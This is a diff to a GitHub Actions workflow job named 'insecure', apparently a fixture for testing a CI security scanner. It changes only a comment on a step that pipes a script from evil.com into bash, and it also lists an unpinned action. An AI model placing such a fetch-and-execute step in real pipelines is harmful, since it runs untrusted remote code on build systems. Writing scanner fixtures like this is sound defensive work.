@@ -5,5 +5,5 @@ jobs:
   insecure:
     runs-on: ubuntu-latest
     steps:
-      - run: curl https://evil.com/install.sh | bash   # critical
+      - run: curl https://evil.com/install.sh | bash   # bery critical
       - uses: actions/upload-artifact@v3               # unpinned
